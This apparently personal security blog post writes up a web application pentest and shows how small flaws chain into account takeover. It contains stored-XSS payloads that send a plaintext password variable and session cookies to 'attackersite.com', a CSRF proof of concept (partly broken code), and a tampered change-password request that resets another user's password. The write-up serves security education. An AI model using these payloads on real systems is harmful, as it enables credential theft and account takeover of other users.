---
layout: post
title: Chaining Small Vulnerabilities to Account takeover
---

## Overview

The application was an admin application which is used to manage users, user-roles, user-groups, and other user account options, I found several vulnerabilities in the applications which can be chained and lead to many account takeovers in the application, firstly I will list the vulnerabilities that I found and after that a demonstration, how I chained the vulnerabilities
<!--more-->
## Found Vulnerabilities

### Plaintext Password in Javascript

This is the first and very basic vulnerabilitiy in this application, when I was reviewing the javascript code of the application, I mostly search for sensitive data like keys, password,username like keywords, I found a variable name `txtpass` to print it's value I used Chrome console

```
ctrl+Shift+I
In the console tab enter
>console.log(txtpass)
Password
```

and found that the users password is stored in plaintext inside this variable

### Session Cookies without HTTPOnly & Secure flag

When i checked for the flags for cookies in the burp suite response I found that the session cookies provided by server does not have any HTTPOnly or Secure flag in it

### No Server-Side Validation

When I was checking the `change password` functionality in the application, the form has three fields, Current Password, New Password, and Confirm New password, When I checked the request in the burp suite tab I found something strange

```
POST /changePassword HTTP/1.1
Host: example.com
...
Cookies=COOKIES

email=test@test.com&newpassword=Password&cfmpassword=Password
```

There was no parameter for Current Password, so is it not being validated?

But when I tried to enter incorrect password, got message that current password is incorrect, so that means the password is validated on client side, JavaScript was doing many checks and one of them was

```javascript
password = txtpass
```

This is the plaintext password varibale which we had encountered before

### Stored Cross Site Scripting

In the user profile section, there was a form to update user details like Name, I tried several payloads but failed due to input handling the special characters are not allowed, but it was the story of frontend

When I intercepted the update request and inserted my payload in name parameter

```
POST /updateUserinfo HTTP/1.1
Host: example.com
...
Cookies=COOKIES

email=test@test.com&fname=<script>alert('XSS')</script>&lname=<script>alert('XSS')</script>
```

it was successfully process and I got popups for both the fields, it was a stored XSS on the profile

### Cross Site Request Forgery

The CSRF was in the Update Password functionality

```
POST /changePassword HTTP/1.1
Host: example.com
...
csrftoken= CSRFTOKENHERE
Cookies=COOKIES

email=test@test.com&newpassword=Password&cfmpassword=Password
```

The request contains a CSRF token in it, when I tested it for some time I found out that only token length is validated, I can send any alphanumeric strings of 35 characters and it will be accepted, i found out this by changing a single character in CSRF token and after that also the request processed successfully

### Improper Access Control

In the same `change password` request there was broken access control, when a user tries to update the password the following request is sent

```
POST /changePassword HTTP/1.1
Host: example.com
...
Cookies=COOKIES

email=test@test.com&newpassword=Password&cfmpassword=Password
```

The cookies are only validated if there is no email parameter in the request, otherwise, and the only thing used to identify the user account is email, that means I can change any user's password just with the email

## Chaining Vulnerabilities to Compromise Admin Account

### Stored Cross Site Scripting + Plaintext Password in Javascript

As we know that there is XSS on the profile page and also that the password are stored in javscript, so I created a payload of XSS by which if any user visits my profile page the value of txtpass variable will be sent to my server which means I got the password of the account by which I can simply login into the account

**Payload**

```javascript
<script>
var url = 'https://attackersite.com?pass=' + txtpass;
var attack = new XMLHttpRequest();
attack.open("GET", url, true);
attack.send(null);
</script>
```

Here attackersite.com is my website from where I can get password inside my server's log file

**Request to update profile**

```
POST /updateUserinfo HTTP/1.1
Host: example.com
...
Cookies=COOKIES

email=test@test.com&fname=<script>var url = 'https://attackersite.com?pass=' + txtpass;var attack = new XMLHttpRequest();attack.open("GET", url, true);attack.send(null);</script>&lname=Test
```

If any user Visits my profile his/her, I will get their account password

### Stored Cross Site Scripting + Cookie without HTTPOnly & Secure flag

As we know that there is XSS on the profile page and also that the session cookies does not have HttpOnly flag set, same as before I created a payload to send the session cookie to my server


**Payload**

```javascript
<script>
var url = 'https://attackersite.com?cookie=' + document.cookies;
var attack = new XMLHttpRequest();
attack.open("GET", url, true);
attack.send(null);
</script>
```

Here attackersite.com is my website from where I can get cookies inside my server's log file

**Request to update profile**

```
POST /updateUserinfo HTTP/1.1
Host: example.com
...
Cookies=COOKIES

email=test@test.com&fname=<script>var url = 'https://attackersite.com?cookie=' + document.cookies;var attack = new XMLHttpRequest();attack.open("GET", url, true);attack.send(null);</script>&lname=Test
```

If any user Visits my profile his/her, I will get their account cookie, which I can use to login into the victim account

### Cross Site Request Forgery + No Server-Side Validation

As we know that there is no CSRF token and also the old password is not validated, so we can make a CSRF POC which will send a request to update the password, we will remove the email parameter so the password will be updated according to user cookie, when a user visits this page, his/her password will be changed

**CSRF POC**
```
<script>
var url = 'https://example.com/changePassword';
var shlupl = new XMLHttpRequest();
shlupl.open("POST",url, true);
shlupl.setRequestHeader("csrftoken","<AnyStringOfLength35Character>");
shell += '\n';
shell += 'newpassword=Password&cfmpassword=Password';
shlupl.send(shell);
</script>
```

### Improper Access Control + No Server-Side Validation

As we know that there is no cookie validation, and also the old password is not being validated, so we can just change the email in change password request to change password of any user, let's say there are two users, test1@test.com & test2@test.com, we will login with test1@test.com and go to change password page, and after filling the form, click on save and intercept the requests

**Initial Request**
```
POST /changePassword HTTP/1.1
Host: example.com
...
Cookies=COOKIES

email=test1@test.com&newpassword=Password&cfmpassword=Password
```

The replace test1@test.com to test2@test.com

**Modified Request**
```
POST /changePassword HTTP/1.1
Host: example.com
...
Cookies=COOKIES

email=test2@test.com&newpassword=Password&cfmpassword=Password
```

On sending this request, password of test2@test.com will be changed to `Password`

## This was a quick writeup of the Exploited Vulnerabilities, to understand in depth I recommend

### Frontend Source Review

[Reviewing the Frontend Source Code of Web Application](https://vj0shii.github.io/security-review-of-frontend-source-code/)

### CSRF

[Compromise complete application with CSRF attack](https://vj0shii.github.io/Compromise-complete-application-with-CSRF-attack/)

### Improper Access Control

[How I was able to update any user's address](https://vj0shii.github.io/updating-address-of-any-user/)

[Testing WebApp Access Control with Autorize](https://vj0shii.github.io/Testing-WebApp-Access-Control-with-Autorize/)

**If you have anything to discuss contact me on my linkedin or twitter account or with the Contact Me form**
